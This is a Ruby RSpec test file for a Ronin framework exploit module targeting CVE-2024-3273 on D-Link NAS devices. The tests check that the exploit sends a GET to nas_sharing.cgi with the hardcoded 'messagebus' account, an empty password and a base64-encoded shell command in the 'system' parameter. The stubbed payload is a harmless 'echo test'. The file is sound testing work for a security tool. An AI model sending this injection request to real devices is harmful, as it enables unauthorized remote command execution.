require 'spec_helper'
require './exploits/d-link/CVE-2024-3273'

require 'webmock/rspec'

describe Ronin::Exploits::CVE_2024_3273 do
  let(:base_url) { 'https://example.com' }
  let(:payload)  { "echo test" }

  subject do
    described_class.new(
      params:  {base_url: base_url},
      payload: payload
    )
  end

  describe "#launch" do
    let(:base64_command) { payload.base64_encode(mode: :url_safe) }

    it "must send a HTTP GET request for '/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=BASE64_ENCODED_COMMAND'" do
      stub_request(:get, "#{base_url}/cgi-bin/nas_sharing.cgi").with(query: {
        user:   'messagebus',
        passwd: '',
        cmd:    '15',
        system: base64_command
      })

      subject.launch
    end

    context "when the HTTP response status is not 200" do
      let(:status) { 404 }

      before do
        stub_request(:get, "#{base_url}/cgi-bin/nas_sharing.cgi").with(query: {
          user:   'messagebus',
          passwd: '',
          cmd:    '15',
          system: payload.base64_encode(mode: :url_safe)
        }).to_return(status: status)
      end

      it do
        expect {
          subject.launch
        }.to raise_error(Ronin::Exploits::ExploitFailed,"GET #{base_url}/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=#{base64_command} returned HTTP #{status}")
      end
    end
  end
end
